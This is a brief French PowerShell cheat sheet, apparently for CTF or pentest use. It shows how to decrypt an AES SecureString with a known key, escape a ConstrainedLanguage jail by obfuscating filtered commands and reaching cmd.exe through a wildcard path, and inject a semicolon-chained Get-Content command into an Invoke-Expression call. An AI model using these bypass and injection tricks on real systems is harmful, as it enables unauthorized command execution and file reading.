# Décrypter une valeur crypter en AES avec la clé
Si une variable a été crypté avec une clé AES et ConvertTo-SecureString on peut utiliser :
```powershell
$aesKey = (2,3,1,4,54,32,144,23,5,3,1,41,36,31,18,175,6,17,1,9,5,1,76,23)
$secureObject = ConvertTo-SecureString -String $encrypted -Key $aesKey 
$decrypted = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($secureObject ) 
$decrypted = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($decrypted) 
$decrypted 
```

# Escape Jails
Pour un jail Powershell de type ConstrainedLanguage avec suppression de lettres et mots :
  - Essayer pour **gc** (Get-Content) => **ggcc** ou **g`c** pour récupérer au final **gc**
  - Lancer **CMD** avec la méthode * => **C:\w\*\s\*32\cmd.exe**
  - Concaténation de string et utilisation de **icm (Invoke-Command)**
  ```powershell
  $a = "g"
  $b = "c"
  $c = "$a$b"
  icm { & $c }
  ```
  - Utilisation des alias => [Liste des alias](https://vulgumtechus.com/Liste_des_alias_dans_PowerShell)

# Injection avec Invoke-Expression (IEX)
Exemple avec ce script :
```powershell
iex "Write-Host Hello $var"
```
Il est possible d'utiliser la variablr $var avec un point-virgule suivi d'une commande
Exemple: 
```powershell
$var=;Get-Content {file}
```
